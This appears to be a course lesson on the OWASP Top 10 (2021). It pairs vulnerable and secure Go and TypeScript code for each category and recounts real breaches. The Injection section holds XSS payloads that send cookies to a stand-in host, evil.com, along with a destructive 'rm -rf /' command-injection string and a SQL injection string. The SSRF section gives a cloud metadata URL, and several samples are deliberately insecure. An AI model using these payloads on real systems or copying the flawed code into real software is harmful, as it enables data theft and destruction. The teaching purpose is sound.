# OWASP Top 10 (2021)

## The "Most Wanted" List for Software Vulnerabilities

Think of the OWASP Top 10 like the FBI's Most Wanted list, but for software vulnerabilities. These aren't theoretical attacks dreamed up in a lab. They're the attacks that actually compromise real systems, steal real data, and cost real money. OWASP (Open Web Application Security Project) compiles this list by analyzing actual breach data from hundreds of organizations.

If you're building anything that touches the internet, these are the threats keeping your security team up at night.

---

## 1. Broken Access Control

### What It Is

Access control enforces who can do what. Broken access control means a user can act outside their intended permissions. Imagine a hotel where every room key opens every door. That's broken access control.

### How the Attack Works

An attacker manipulates URLs, API requests, or internal references to access resources belonging to other users or perform actions above their privilege level.

Common patterns:
- Changing `/api/users/123/profile` to `/api/users/456/profile` (IDOR — Insecure Direct Object Reference)
- A regular user accessing `/admin/dashboard` because the server only hides the link but doesn't check permissions
- Modifying a POST body to include `"role": "admin"` during registration

### Attack Flow

```
BROKEN ACCESS CONTROL:

The vulnerability:
  GET /api/users/42/profile  ← Alice views her own profile (user 42)
  GET /api/users/43/profile  ← Alice changes 42 to 43... sees Bob's data!

  ┌─────────┐     ┌──────────┐     ┌──────────┐
  │ Alice   │────>│  Server  │────>│ Database │
  │ (id=42) │     │          │     │          │
  │         │     │ Checks:  │     │          │
  │ Requests│     │ ✓ Logged │     │          │
  │ id=43   │     │ ✗ Is 43  │     │ Returns  │
  │         │     │   = 42?  │     │ Bob's    │
  │         │<────│   NOPE.  │<────│ data!    │
  └─────────┘     └──────────┘     └──────────┘

  The server checked IF Alice is logged in.
  It did NOT check if Alice SHOULD see user 43's data.
  This is called an IDOR (Insecure Direct Object Reference).
```

### Real-World Example

In 2019, First American Financial Corporation exposed 885 million records because their document access system used sequential URLs. Changing the document number in the URL gave access to anyone's mortgage documents, Social Security numbers, and bank statements. No authentication bypass needed — just increment a number.

### Vulnerable vs Secure Code

**Go — Vulnerable:**

```go
func GetUserProfile(w http.ResponseWriter, r *http.Request) {
    userID := r.URL.Query().Get("user_id")

    var profile UserProfile
    err := db.QueryRow("SELECT * FROM profiles WHERE user_id = $1", userID).Scan(&profile)
    if err != nil {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }

    json.NewEncoder(w).Encode(profile)
}
```

**Go — Secure:**

```go
func GetUserProfile(w http.ResponseWriter, r *http.Request) {
    requestedID := r.URL.Query().Get("user_id")
    authenticatedID := r.Context().Value("user_id").(string)

    if requestedID != authenticatedID && !hasRole(r.Context(), "admin") {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }

    var profile UserProfile
    err := db.QueryRow("SELECT * FROM profiles WHERE user_id = $1", requestedID).Scan(&profile)
    if err != nil {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }

    json.NewEncoder(w).Encode(profile)
}
```

**TypeScript — Vulnerable:**

```typescript
app.get("/api/documents/:id", async (req, res) => {
  const doc = await prisma.document.findUnique({
    where: { id: req.params.id },
  });
  res.json(doc);
});
```

**TypeScript — Secure:**

```typescript
app.get("/api/documents/:id", authenticate, async (req, res) => {
  const doc = await prisma.document.findUnique({
    where: {
      id: req.params.id,
      ownerId: req.user.id,
    },
  });

  if (!doc) {
    return res.status(404).json({ error: "Not found" });
  }

  res.json(doc);
});
```

### Prevention Checklist

- [ ] Deny access by default — require explicit grants
- [ ] Check authorization on every request, server-side
- [ ] Use indirect references (UUIDs) instead of sequential IDs
- [ ] Log access control failures and alert on repeated attempts
- [ ] Disable directory listing on web servers
- [ ] Rate limit API access to minimize automated scanning
- [ ] Implement ownership checks at the data layer, not just UI

---

## 2. Cryptographic Failures

### What It Is

Previously called "Sensitive Data Exposure," this covers failures in protecting data through cryptography — or not using cryptography at all. Think of it like sending postcards instead of sealed letters. Anyone who handles the postcard in transit can read it.

### How the Attack Works

- Data transmitted in cleartext (HTTP instead of HTTPS)
- Sensitive data stored without encryption (plaintext passwords, unencrypted database columns)
- Using weak or deprecated algorithms (MD5, SHA-1, DES)
- Poor key management (hardcoded keys, keys in source control)
- Missing TLS certificate validation

### Real-World Example

The 2013 Adobe breach exposed 153 million user records. Passwords were encrypted with 3DES in ECB mode (not even hashed — encrypted, meaning they were reversible). The same password always produced the same ciphertext, and password hints were stored in plaintext alongside the encrypted passwords. Attackers could group identical ciphertexts and use the hints to crack them.

### Vulnerable vs Secure Code

**Go — Vulnerable:**

```go
func storePassword(password string) string {
    hash := md5.Sum([]byte(password))
    return hex.EncodeToString(hash[:])
}

func connectToAPI() {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
    client.Get("https://api.example.com/data")
}
```

**Go — Secure:**

```go
func storePassword(password string) (string, error) {
    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    if err != nil {
        return "", fmt.Errorf("hashing password: %w", err)
    }
    return string(hash), nil
}

func connectToAPI() {
    client := &http.Client{}
    resp, err := client.Get("https://api.example.com/data")
    if err != nil {
        log.Printf("API request failed: %v", err)
        return
    }
    defer resp.Body.Close()
}
```

**TypeScript — Vulnerable:**

```typescript
import crypto from "crypto";

function hashPassword(password: string): string {
  return crypto.createHash("sha1").update(password).digest("hex");
}

const API_KEY = "sk-live-abc123secretkey";
```

**TypeScript — Secure:**

```typescript
import bcrypt from "bcryptjs";

async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 12);
}

const API_KEY = process.env.API_KEY;
if (!API_KEY) {
  throw new Error("API_KEY environment variable is required");
}
```

### Prevention Checklist

- [ ] Classify data by sensitivity — know what needs protection
- [ ] Encrypt all data in transit (TLS 1.2+ everywhere)
- [ ] Encrypt sensitive data at rest (AES-256-GCM)
- [ ] Use strong password hashing (bcrypt, Argon2id)
- [ ] Never hardcode secrets — use environment variables or secret managers
- [ ] Disable caching for responses containing sensitive data
- [ ] Rotate encryption keys on a regular schedule

---

## 3. Injection

### What It Is

Injection attacks happen when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands. Covered extensively in lesson 09.

Think of injection like a ventriloquist. The attacker makes your application say things you didn't intend by sneaking commands into what your application thinks is just data.

### How the Attack Works

The attacker finds an input that gets incorporated into a command without proper sanitization:
- SQL injection: `' OR 1=1 --`
- Command injection: `; rm -rf /`
- XSS: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`

### Attack Flow

```
SQL INJECTION ATTACK FLOW:

Normal request:
  User types: "alice"
  Query becomes: SELECT * FROM users WHERE name = 'alice'
  Result: Alice's record ✓

Attack request:
  User types: ' OR '1'='1' --
  Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1' --'

  What the database sees:
  ┌──────────────────────────────────────────────────┐
  │ SELECT * FROM users WHERE name = ''              │
  │                           OR '1'='1'  ← always true!
  │                           --'         ← rest is comment
  └──────────────────────────────────────────────────┘
  Result: ALL users returned. Entire database dumped.

The fix — parameterized queries:
  Query: SELECT * FROM users WHERE name = $1
  Parameter: "' OR '1'='1' --"

  The database treats the ENTIRE input as a literal string.
  No part of it is interpreted as SQL. The attack string
  becomes just a weird name to search for (no results).
```

```
XSS ATTACK FLOW (Stored XSS):

Step 1: Attacker posts a "comment" containing JavaScript
  Comment: "Nice post! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

Step 2: Server stores it in the database (no sanitization)

Step 3: Victim loads the page
  ┌─────────┐     ┌──────────┐     ┌──────────────┐
  │ Victim  │────>│  Server  │────>│  Database    │
  │ Browser │     │  sends   │     │  returns     │
  │         │<────│  page +  │<────│  comment     │
  │         │     │  comment │     │  with script │
  └────┬────┘     └──────────┘     └──────────────┘
       │
       │ Browser executes the script!
       v
  ┌──────────┐
  │ evil.com │ ← receives victim's session cookie
  └──────────┘

  Now the attacker has the victim's session.
  They can log in AS the victim.
```

### Real-World Example

The 2017 Equifax breach (147 million records) started with a Struts framework vulnerability that allowed command injection. But SQL injection remains the most common. In 2015, TalkTalk lost 157,000 customer records through a basic SQL injection attack that a teenager executed.

### Vulnerable vs Secure Code

**Go — Vulnerable:**

```go
func getUser(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")
    query := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", username)
    rows, err := db.Query(query)
    if err != nil {
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
}
```

**Go — Secure:**

```go
func getUser(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")
    rows, err := db.Query("SELECT * FROM users WHERE username = $1", username)
    if err != nil {
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
}
```

**TypeScript — Vulnerable:**

```typescript
app.get("/users", async (req, res) => {
  const { name } = req.query;
  const users = await prisma.$queryRawUnsafe(
    `SELECT * FROM users WHERE name = '${name}'`
  );
  res.json(users);
});
```

**TypeScript — Secure:**

```typescript
app.get("/users", async (req, res) => {
  const { name } = req.query;
  if (typeof name !== "string") {
    return res.status(400).json({ error: "Invalid name parameter" });
  }

  const users = await prisma.user.findMany({
    where: { name },
  });
  res.json(users);
});
```

### Prevention Checklist

- [ ] Use parameterized queries / prepared statements for all SQL
- [ ] Use an ORM (Prisma, GORM) with its safe query builder
- [ ] Validate and sanitize all user inputs
- [ ] Apply output encoding for the correct context (HTML, JS, URL)
- [ ] Use Content Security Policy headers
- [ ] Run SQL accounts with least privilege

---

## 4. Insecure Design

### What It Is

This is about fundamental design flaws, not implementation bugs. You can write perfectly clean code that implements a fundamentally insecure design. Think of it like building a bank vault with a really strong door but putting it in a building with no walls.

### How the Attack Works

Insecure design is the absence of security controls that should have been designed in from the start:
- No rate limiting on a "forgot password" endpoint, allowing brute force
- A checkout flow that trusts client-side price calculations
- A file upload feature with no validation on file type or size
- A security question system that's easily guessable ("What city were you born in?")

### Real-World Example

Snapchat's "Find Friends" feature let anyone enumerate phone numbers. Attackers used it to match 4.6 million usernames to phone numbers in 2014. The feature was designed without rate limiting or abuse prevention — a design flaw, not an implementation bug.

### Vulnerable vs Secure Code

**Go — Vulnerable (no rate limiting):**

```go
func resetPassword(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    code := r.FormValue("code")

    storedCode, err := getResetCode(email)
    if err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    if code == storedCode {
        allowPasswordReset(w, r, email)
        return
    }

    http.Error(w, "Invalid code", http.StatusUnauthorized)
}
```

**Go — Secure (rate limited + lockout):**

```go
func resetPassword(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    code := r.FormValue("code")

    attempts, err := getResetAttempts(email)
    if err != nil {
        http.Error(w, "Internal error", http.StatusInternalServerError)
        return
    }

    if attempts >= 5 {
        lockoutResetCode(email)
        http.Error(w, "Too many attempts. Request a new code.", http.StatusTooManyRequests)
        return
    }

    incrementResetAttempts(email)

    storedCode, err := getResetCode(email)
    if err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    if !timeSafeCompare(code, storedCode) {
        http.Error(w, "Invalid code", http.StatusUnauthorized)
        return
    }

    allowPasswordReset(w, r, email)
}
```

### Prevention Checklist

- [ ] Establish a secure development lifecycle with threat modeling
- [ ] Use abuse case stories alongside user stories ("As an attacker, I want to...")
- [ ] Design rate limiting and anti-automation from the start
- [ ] Never trust client-side calculations for sensitive operations
- [ ] Separate trust boundaries — don't let one component's compromise cascade
- [ ] Conduct design reviews focused on security before coding starts

---

## 5. Security Misconfiguration

### What It Is

The application is properly designed and the code is solid, but the deployment is misconfigured. Think of it like having a great lock on your front door but leaving the back window wide open.

### How the Attack Works

- Default credentials left unchanged (admin/admin)
- Unnecessary features enabled (directory listing, debug mode, sample apps)
- Verbose error messages exposing stack traces to users
- Cloud storage (S3 buckets) left public
- Missing security headers
- Outdated software with known vulnerabilities

### Real-World Example

In 2017, hundreds of companies had their data exposed through misconfigured Amazon S3 buckets. Verizon exposed 6 million customer records, Dow Jones exposed 2.2 million, and the Pentagon exposed 1.8 billion social media monitoring records. All because someone clicked "public" instead of "private."

### Vulnerable vs Secure Code

**Go — Vulnerable:**

```go
func main() {
    router := mux.NewRouter()
    router.HandleFunc("/api/data", getData)

    log.Fatal(http.ListenAndServe(":8080", router))
}

func errorHandler(w http.ResponseWriter, err error) {
    http.Error(w, fmt.Sprintf("Error: %v\nStack: %s", err, debug.Stack()), 500)
}
```

**Go — Secure:**

```go
func main() {
    router := mux.NewRouter()
    router.HandleFunc("/api/data", getData)

    srv := &http.Server{
        Addr:         ":8080",
        Handler:      securityHeaders(router),
        ReadTimeout:  10 * time.Second,
        WriteTimeout: 10 * time.Second,
        IdleTimeout:  120 * time.Second,
    }

    log.Fatal(srv.ListenAndServeTLS("cert.pem", "key.pem"))
}

func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("Content-Security-Policy", "default-src 'self'")
        w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
        next.ServeHTTP(w, r)
    })
}

func errorHandler(w http.ResponseWriter, err error) {
    log.Printf("Internal error: %v", err)
    http.Error(w, "An internal error occurred", http.StatusInternalServerError)
}
```

**TypeScript — Vulnerable:**

```typescript
const app = express();

app.use(express.json());

app.listen(3000);
```

**TypeScript — Secure:**

```typescript
import helmet from "helmet";
import rateLimit from "express-rate-limit";

const app = express();

app.use(helmet());
app.use(express.json({ limit: "10kb" }));
app.use(
  rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
  })
);
app.disable("x-powered-by");

if (process.env.NODE_ENV === "production") {
  app.set("trust proxy", 1);
}

app.listen(3000);
```

### Prevention Checklist

- [ ] Remove or disable unused features, frameworks, and endpoints
- [ ] Change all default credentials
- [ ] Send security headers (use helmet in Express, manual in Go)
- [ ] Disable debug mode and verbose errors in production
- [ ] Automate configuration verification in CI/CD
- [ ] Review cloud permissions (S3 buckets, IAM roles)
- [ ] Keep all software and dependencies up to date

---

## 6. Vulnerable and Outdated Components

### What It Is

Using libraries, frameworks, or other software components with known vulnerabilities. This is like driving a car where the manufacturer issued a recall for faulty brakes but you never took it in. The fix exists. You just haven't applied it.

### How the Attack Works

Attackers monitor CVE databases and public vulnerability disclosures. When a vulnerability is published for a popular library, they scan the internet for applications still running the vulnerable version. The time between disclosure and exploitation is often measured in hours.

### Real-World Example

The 2017 Equifax breach exploited a known vulnerability in Apache Struts (CVE-2017-5638). The patch had been available for two months before the breach. 147 million Americans had their Social Security numbers, birth dates, and addresses exposed because Equifax didn't apply a two-month-old patch.

Log4Shell (CVE-2021-44228) in December 2021 affected virtually every Java application using Log4j. A single string in a log message could trigger remote code execution.

### Prevention Checklist

- [ ] Maintain an inventory of all components and their versions
- [ ] Remove unused dependencies
- [ ] Monitor CVE databases and security advisories
- [ ] Use `npm audit`, `go vuln check`, or Snyk in CI/CD
- [ ] Only obtain components from official sources over secure links
- [ ] Subscribe to security mailing lists for your critical dependencies
- [ ] Have a patch management process with defined SLAs

---

## 7. Identification and Authentication Failures

### What It Is

Weaknesses in the authentication process that allow attackers to assume other users' identities. This is like a nightclub bouncer who accepts any ID without checking the photo. Covered in depth in lesson 10.

### How the Attack Works

- Credential stuffing (using breached username/password lists from other sites)
- Brute force attacks on login endpoints without rate limiting
- Allowing weak passwords ("password123")
- Exposing session IDs in URLs
- Not invalidating sessions on logout or password change
- Missing multi-factor authentication on sensitive accounts

### Real-World Example

In 2020, Nintendo confirmed that 300,000 accounts were compromised through credential stuffing. Attackers used username/password pairs from other breaches to access Nintendo accounts, make unauthorized purchases, and view personal information. No MFA was required.

### Prevention Checklist

- [ ] Implement multi-factor authentication
- [ ] Never ship with default credentials
- [ ] Check passwords against known breached password lists
- [ ] Implement rate limiting and account lockout
- [ ] Use secure session management (see lesson 10)
- [ ] Invalidate sessions on logout, password change, and idle timeout
- [ ] Log all authentication failures for monitoring

---

## 8. Software and Data Integrity Failures

### What It Is

Code and infrastructure that doesn't protect against integrity violations. This is like a restaurant that accepts food deliveries without checking if the seals are intact. Someone could have tampered with the package.

### How the Attack Works

- CI/CD pipelines that pull dependencies without verification
- Auto-update mechanisms without signature verification
- Deserialization of untrusted data (object injection)
- Compromised build pipelines (supply chain attacks)

### Real-World Example

The SolarWinds attack (2020) is the textbook example. Attackers compromised SolarWinds' build pipeline and injected malicious code into the Orion software update. 18,000 organizations, including US government agencies, installed the trojanized update because they trusted the software vendor's update mechanism. The malicious code was signed with SolarWinds' legitimate certificate.

### Prevention Checklist

- [ ] Verify digital signatures on software and updates
- [ ] Use dependency lock files (package-lock.json, go.sum)
- [ ] Review code changes — don't auto-merge dependency updates
- [ ] Secure your CI/CD pipeline (restrict access, audit logs)
- [ ] Avoid deserializing untrusted data; if you must, validate schema first
- [ ] Use Subresource Integrity (SRI) for CDN-hosted scripts

---

## 9. Security Logging and Monitoring Failures

### What It Is

If your application doesn't log security events or nobody monitors those logs, attackers can operate undetected for months. This is like having a bank with no security cameras. Even if you eventually notice money is missing, you have no idea who took it or when.

### How the Attack Works

This isn't an attack technique — it's the absence of defense that makes every other attack worse:
- No logging of authentication failures
- No alerting on suspicious patterns (100 failed logins from one IP)
- Logs stored locally where an attacker can delete them
- No audit trail for sensitive operations
- Logs that don't include enough context to investigate

### Real-World Example

The average time to detect a data breach is 204 days (IBM Cost of a Data Breach Report 2023). Many of the largest breaches in history went undetected for months because of inadequate logging and monitoring. Target's 2013 breach was detected by a third party, not Target's own security team, despite their security tools generating alerts that went uninvestigated.

### Prevention Checklist

- [ ] Log all authentication events (success and failure)
- [ ] Log access control failures
- [ ] Log input validation failures (potential injection attempts)
- [ ] Include context: who, what, when, where, outcome
- [ ] Send logs to a centralized, append-only system
- [ ] Set up alerts for suspicious patterns
- [ ] Test your incident response plan regularly
- [ ] Ensure logs cannot be tampered with by attackers

---

## 10. Server-Side Request Forgery (SSRF)

### What It Is

SSRF happens when an attacker can make your server send requests to unintended destinations. Think of it like tricking a secretary into making phone calls on your behalf. The calls come from the company's phone number, so the recipient trusts them.

### How the Attack Works

1. Application accepts a URL from user input (e.g., "fetch this image URL")
2. Server fetches the URL on the user's behalf
3. Attacker provides internal URLs: `http://169.254.169.254/latest/meta-data/` (AWS metadata)
4. Server fetches internal resources and returns them to the attacker
5. Attacker now has cloud credentials, internal service data, or can scan the internal network

### Attack Flow

```
SSRF ATTACK FLOW:

Normal usage:
  User: "Fetch this URL: https://example.com/image.png"
  Server: fetches image, returns to user ✓

Attack:
  User: "Fetch this URL: http://169.254.169.254/latest/meta-data/"

  ┌──────────┐        ┌──────────┐        ┌──────────────────┐
  │ Attacker │──req──>│  Your    │──req──>│ AWS Metadata     │
  │ (outside)│        │  Server  │        │ Service (inside) │
  │          │<─resp──│          │<─resp──│                  │
  └──────────┘        └──────────┘        └──────────────────┘

  Your server is INSIDE the network.
  The metadata service trusts internal requests.
  The attacker uses YOUR server as a proxy
  to reach internal services they can't access directly.

  169.254.169.254 = AWS instance metadata
  Returns: IAM credentials, API keys, instance identity

  This is how Capital One was breached in 2019 (100M records).
```

### Real-World Example

The 2019 Capital One breach (100 million records) was an SSRF attack. The attacker exploited a misconfigured WAF to send requests to the AWS metadata service, obtained temporary credentials, and used those to access S3 buckets containing customer data.

### Prevention Checklist

- [ ] Sanitize and validate all client-supplied URLs
- [ ] Use an allowlist of permitted domains/IP ranges
- [ ] Block requests to internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
- [ ] Disable HTTP redirects or validate destination after redirect
- [ ] Don't return raw responses from server-side requests
- [ ] Use network segmentation — fetch services shouldn't access sensitive internal resources
- [ ] On AWS, use IMDSv2 which requires a token for metadata access

---

## Summary: The Security Mindset

```
OWASP TOP 10 AT A GLANCE:

  Attack Surface Map:

  User Input ──────────> [Injection, XSS]
  Authentication ──────> [Broken Auth, Credential Stuffing]
  Authorization ───────> [Broken Access Control, IDOR]
  Server Config ───────> [Misconfiguration, Default Creds]
  Dependencies ────────> [Vulnerable Components, Supply Chain]
  Data Storage ────────> [Sensitive Data Exposure, Weak Crypto]
  Server-side Requests > [SSRF]
  Logging ─────────────> [Insufficient Monitoring]

  Defense layers:
  ┌─────────────────────────────────────────────────┐
  │ WAF (Web Application Firewall)                  │  ← Network edge
  ├─────────────────────────────────────────────────┤
  │ Input validation + output encoding              │  ← Application
  ├─────────────────────────────────────────────────┤
  │ Authentication + Authorization                  │  ← Identity
  ├─────────────────────────────────────────────────┤
  │ Parameterized queries + ORM                     │  ← Data access
  ├─────────────────────────────────────────────────┤
  │ Dependency scanning + updates                   │  ← Supply chain
  ├─────────────────────────────────────────────────┤
  │ Logging + alerting + incident response          │  ← Detection
  └─────────────────────────────────────────────────┘
```

The OWASP Top 10 isn't a checklist to complete once and forget. It's a framework for thinking about security throughout the development lifecycle.

**The pattern across all 10:**

| Principle | What It Means |
|-----------|--------------|
| Default deny | Block everything, then explicitly allow |
| Defense in depth | Multiple layers, never just one control |
| Least privilege | Give minimum permissions necessary |
| Validate everything | Never trust user input, ever |
| Fail securely | Errors should deny access, not grant it |
| Log everything | If you can't see it, you can't stop it |

**Where to go deeper:**
- Lesson 09: Injection attacks in detail
- Lesson 10: Authentication deep dive
- Lesson 11: Authorization and OAuth
- Lesson 12: JWT security
- Lesson 13: CORS and CSRF
- Lesson 14: Password storage

The attacks in this list are not sophisticated. Most exploits of the OWASP Top 10 are automated scans by bots running 24/7. The bar for prevention is not genius-level security engineering. It's consistent application of basic principles. The organizations that get breached usually know about these vulnerabilities. They just didn't prioritize fixing them.
